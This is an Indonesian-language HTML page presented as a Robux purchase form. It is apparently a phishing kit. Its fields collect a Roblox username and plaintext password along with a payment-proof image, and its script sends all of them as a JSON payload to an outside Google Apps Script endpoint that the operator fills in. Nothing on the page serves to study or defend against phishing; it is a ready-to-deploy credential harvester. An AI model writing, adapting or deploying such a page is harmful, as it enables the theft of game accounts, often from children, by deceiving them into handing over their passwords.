<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<title>Formulir Robux VILOG</title>
<style>
  body { font-family: Arial; padding:20px; background:#f2f6fa; }
  .card { max-width:450px; margin:auto; padding:14px; background:#fff; border-radius:12px; border:2px solid #8296AD; }
  .form-input, .form-select { width:100%; padding:8px; margin-bottom:8px; border-radius:6px; border:1px solid #ccc; box-sizing:border-box; }
  .btn { padding:10px; border:none; border-radius:8px; cursor:pointer; color:white; width:100%; margin-top:6px; }
  .btn-wa { background:#25D366; }
  .btn-tg { background:#0088cc; }
  #uploadStatus { display:none; margin-top:6px; }
</style>
</head>
<body>
<div class="card">
  <h2>Formulir Pembelian Robux</h2>
  <label>Nama:</label><input id="nama" class="form-input" type="text">
  <label>Username Roblox:</label><input id="roblox_user" class="form-input" type="text">
  <label>Password Roblox:</label><input id="roblox_pass" class="form-input" type="password">
  <label>Jumlah Robux:</label><input id="jumlah" class="form-input" type="number">
  <label>Upload Bukti:</label><input id="bukti" type="file" accept="image/*" class="form-input">
  <button class="btn btn-tg" onclick="submitForm()">Kirim</button>
  <div id="uploadStatus"></div>
</div>

<script>
const APPS_SCRIPT_URL = "MASUKKAN_WEB_APP_URL_MU";

function submitForm(){
  const nama = document.getElementById('nama').value.trim();
  const user = document.getElementById('roblox_user').value.trim();
  const pass = document.getElementById('roblox_pass').value.trim();
  const jumlah = document.getElementById('jumlah').value.trim();
  const fileInput = document.getElementById('bukti');
  const statusEl = document.getElementById('uploadStatus');

  if(!nama || !user || !pass || !jumlah || !fileInput.files.length){
    alert("Isi semua field dan pilih bukti pembayaran.");
    return;
  }

  const file = fileInput.files[0];
  const reader = new FileReader();
  reader.onload = async function(){
    const base64 = reader.result.split(",")[1];
    const payload = {
      message: `Nama: ${nama}\nUsername: ${user}\nPassword: ${pass}\nJumlah: ${jumlah}`,
      filename: file.name,
      mimetype: file.type,
      image: base64
    };
    statusEl.style.display = "block";
    statusEl.innerText = "Mengirim data...";

    try{
      const res = await fetch(APPS_SCRIPT_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      const data = await res.json();
      if(data.result === "success"){
        statusEl.innerText = "Berhasil dikirim! File URL: " + data.fileUrl;
      } else {
        statusEl.innerText = "Gagal: " + data.message;
      }
    } catch(err){
      statusEl.innerText = "Error: " + err;
    }
  };
  reader.readAsDataURL(file);
}
</script>
</body>
</html>
